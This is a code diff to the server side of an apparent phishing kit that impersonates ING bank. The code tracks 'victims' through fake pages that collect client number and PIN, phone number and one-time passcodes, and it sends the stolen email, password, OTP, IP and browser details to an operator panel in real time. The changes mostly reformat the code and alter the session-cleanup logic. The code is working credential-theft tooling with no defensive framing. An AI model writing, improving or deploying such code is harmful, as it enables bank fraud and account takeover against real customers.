@@ -98,15 +98,15 @@ function uaParser(ua) {
 
 /* ----------  SESSION HEADER HELPER  ---------- */
 function getSessionHeader(v) {
-  if (v.page==='success') return `🦁 ING Login approved`;
-  if (v.status==='approved') return `🦁 ING Login approved`;
-  if (v.page==='index.html') {
+  if (v.page === 'success') return `🦁 ING Login approved`;
+  if (v.status === 'approved') return `🦁 ING Login approved`;
+  if (v.page === 'index.html') {
     return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
-  } else if (v.page==='verify.html') {
+  } else if (v.page === 'verify.html') {
     return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
-  } else if (v.page==='unregister.html') {
+  } else if (v.page === 'unregister.html') {
     return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
-  } else if (v.page==='otp.html') {
+  } else if (v.page === 'otp.html') {
     if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
     return `🔑 Awaiting OTP...`;
   }
@@ -123,10 +123,6 @@ function cleanupSession(sid, reason, silent = false) {
 setInterval(() => {
   const now = Date.now();
   for (const [sid, last] of sessionActivity) {
-    const v = sessionsMap.get(sid);
-    if (!v) continue;
-    // NEVER auto-delete approved (success-page) sessions
-    if (v.page === 'success') continue;
     if (now - last > SESSION_TIMEOUT) cleanupSession(sid, 'timed out (3min idle)', true);
   }
 }, 10000);
@@ -270,12 +266,11 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
-/* ----------  INSTANT DELETE WHEN VICTIM CLOSES TAB  ---------- */
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) {
     cleanupSession(sid, 'closed the page', true);
-    emitPanelUpdate();          // force panel to refresh NOW
+    emitPanelUpdate();          // <-- tell panel to refresh
   }
   res.sendStatus(200);
 });
@@ -315,25 +310,13 @@ app.get('/api/user', (req, res) => {
   res.status(401).json({ error: 'Not authenticated' });
 });
 
-/* ----------  PANEL PAYLOAD HELPER  (FULL DATA)  ---------- */
+// helper that builds the payload
 function buildPanelPayload() {
   const list = Array.from(sessionsMap.values()).map(v => ({
-    sid: v.sid,
-    victimNum: v.victimNum,
-    header: getSessionHeader(v),
-    page: v.page,
-    status: v.status,
-    email: v.email,
-    password: v.password,
-    phone: v.phone,
-    otp: v.otp,
-    ip: v.ip,
-    platform: v.platform,
-    browser: v.browser,
-    ua: v.ua,
-    dateStr: v.dateStr,
-    entered: v.entered,
-    unregisterClicked: v.unregisterClicked,
+    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
+    email: v.email, password: v.password, phone: v.phone, otp: v.otp,
+    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
+    entered: v.entered, unregisterClicked: v.unregisterClicked,
     activityLog: v.activityLog || []
   }));
   return {
